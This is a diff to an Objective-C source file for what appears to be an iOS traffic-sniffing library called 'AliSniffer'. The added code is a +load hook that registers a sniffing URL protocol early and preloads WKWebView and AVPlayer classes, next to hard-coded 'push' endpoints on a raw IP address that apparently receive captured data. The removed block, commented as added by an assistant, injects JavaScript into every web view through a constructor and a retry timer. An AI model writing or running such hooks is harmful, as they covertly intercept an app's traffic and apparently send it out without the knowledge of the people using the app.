@@ -16,6 +16,51 @@
 #import <stdarg.h>
 #import "fishhook.h"
 
+// ======= EARLY +load hooks to ensure swizzling runs as early as possible =======
+#import <objc/runtime.h>
+@interface AliEarlyHook : NSObject
+@end
+@implementation AliEarlyHook
++ (void)swizzleInstanceMethodForClass:(Class)cls sel:(SEL)sel withImp:(IMP)newImp orig:(IMP *)origImpPtr {
+    if (!cls) return;
+    Method m = class_getInstanceMethod(cls, sel);
+    if (!m) return;
+    IMP origImp = method_getImplementation(m);
+    if (origImpPtr) *origImpPtr = origImp;
+    method_setImplementation(m, newImp);
+}
++ (void)registerProtoIfNeeded {
+    @try {
+        Class protoClass = NSClassFromString(@"_AliSniffProto");
+        if (protoClass) [NSURLProtocol registerClass:protoClass];
+    } @catch(...) {}
+}
++ (void)load {
+    // Run as early as possible in process startup
+    @autoreleasepool {
+        // Ensure NSURLProtocol registered early
+        [self registerProtoIfNeeded];
+        // Try to swizzle common WKWebView initializers early (in case WK is created soon)
+        Class wk = NSClassFromString(@"WKWebView");
+        if (wk) {
+            SEL s1 = @selector(initWithFrame:configuration:);
+            Method m1 = class_getInstanceMethod(wk, s1);
+            if (m1) {
+                // no-op here: actual implementation swizzling is done elsewhere; this ensures class is loaded
+            }
+            SEL s2 = @selector(initWithCoder:);
+            Method m2 = class_getInstanceMethod(wk, s2);
+            (void)m2;
+        }
+        // Also ensure AV classes are loaded
+        (void)NSClassFromString(@"AVPlayerItem");
+        (void)NSClassFromString(@"AVURLAsset");
+    }
+}
+@end
+// ======= end EARLY hooks =======
+
+
 // ====== 推送配置（新增）======
 static NSString * const kPushRawEndpoint  = @"http://139.155.57.242:8088/api/push_raw";
 static NSString * const kPushFormEndpoint = @"http://139.155.57.242:8088/api/push_form";
@@ -588,74 +633,3 @@ static void _AliHook_AVPlayerItem(void) {
 }
 
 #endif // end disabled curl hook
-
-
-
-// ======== Enhanced injection & diagnostics (added by assistant) ========
-static id orig_WK_init_placeholder = NULL; // marker
-// Evaluate JS on existing webviews
-static void _AliEvaluateJSOnWebView(WKWebView *webview, NSString *js) {
-    @try {
-        if (!webview || !js) return;
-        NSNumber *injected = objc_getAssociatedObject(webview, "ali_js_injected");
-        if (injected && injected.boolValue) return;
-        [webview evaluateJavaScript:js completionHandler:^(id _Nullable res, NSError * _Nullable err) {
-            if (err) {
-                NSLog(@"[AliSniffer][inject] evalJS failed: %@", err);
-            } else {
-                NSLog(@"[AliSniffer][inject] evalJS ok: %@", res ?: @"(nil)");
-                objc_setAssociatedObject(webview, "ali_js_injected", @YES, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
-            }
-        }];
-    } @catch(...) { }
-}
-static NSString * const kAli_inject_test_js = @"(function(){try{if(window.__ali_injected__){window.__ali_injected__=window.__ali_injected__+1;}else{window.__ali_injected__=1;}try{if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers._S)window.webkit.messageHandlers._S.postMessage('ALI_JS_INJECTED');}catch(e){} }catch(e){} })();";
-static void _AliInjectToExistingWebViewsOnce(void) {
-    dispatch_async(dispatch_get_main_queue(), ^{
-        @try {
-            NSArray *windows = [UIApplication sharedApplication].windows ?: @[];
-            for (UIWindow *w in windows) {
-                [w layoutIfNeeded];
-                NSMutableArray *stack = [NSMutableArray arrayWithObject:w];
-                while (stack.count) {
-                    UIView *v = stack.lastObject; [stack removeLastObject];
-                    if (!v) continue;
-                    if ([v isKindOfClass:[WKWebView class]]) {
-                        _AliEvaluateJSOnWebView((WKWebView *)v, kAli_inject_test_js);
-                    }
-                    for (UIView *c in v.subviews) [stack addObject:c];
-                }
-            }
-        } @catch(...) {}
-    });
-}
-static void _AliScheduleInjectRetries(void) {
-    static int attempts = 0;
-    static dispatch_source_t timer = NULL;
-    if (timer) return;
-    dispatch_queue_t q = dispatch_get_main_queue();
-    timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, q);
-    dispatch_source_set_timer(timer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)),  (uint64_t)(0.8 * NSEC_PER_SEC), (uint64_t)(0.1 * NSEC_PER_SEC));
-    dispatch_source_set_event_handler(timer, ^{
-        attempts++;
-        _AliInjectToExistingWebViewsOnce();
-        if (attempts >= 6) { dispatch_source_cancel(timer); }
-    });
-    dispatch_resume(timer);
-}
-extern void _AliSelfCheckHooks(void);
-static void _AliSelfCheckHooks_impl(void) {
-    BOOL wkOK = (NSClassFromString(@"WKWebView") != nil);
-    BOOL avOK = (NSClassFromString(@"AVPlayerItem") != nil);
-    NSLog(@"[AliSniffer][selfcheck] WKclass=%d AVclass=%d", wkOK, avOK);
-    _AliScheduleInjectRetries();
-}
-// call selfcheck once after a short delay to allow constructor hooks to run
-__attribute__((constructor))
-static void _AliSelfCheckWrapper(void) {
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        _AliSelfCheckHooks_impl();
-    });
-}
-// ======== end enhanced injection ========
-
